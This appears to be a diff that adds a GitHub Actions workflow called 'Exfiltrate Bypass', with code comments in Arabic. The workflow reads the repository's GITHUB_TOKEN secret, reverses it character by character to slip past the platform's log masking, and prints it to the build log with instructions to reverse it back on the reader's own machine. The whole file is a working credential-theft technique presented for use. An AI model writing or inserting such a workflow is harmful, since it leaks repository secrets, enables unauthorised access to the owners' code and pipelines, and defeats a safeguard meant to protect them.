@@ -1,0 +1,19 @@
+name: Exfiltrate Bypass
+on: [workflow_dispatch]
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Steal Token (Reversed)
+      run: |
+        echo "Bypassing Masking..."
+        # الحصول على التوكن
+        TOKEN="${{ secrets.GITHUB_TOKEN }}"
+        
+        # عكس التوكن حرفاً حرفاً باستخدام بايثون (أكثر استقراراً من rev أحياناً)
+        REVERSED=$(echo "$TOKEN" | python3 -c "import sys; print(sys.stdin.read().strip()[::-1])")
+        
+        echo "----------------------------------------"
+        echo "REVERSED_TOKEN: $REVERSED"
+        echo "----------------------------------------"
+        echo "Copy the string above and run 'echo STRING | rev' on your machine."
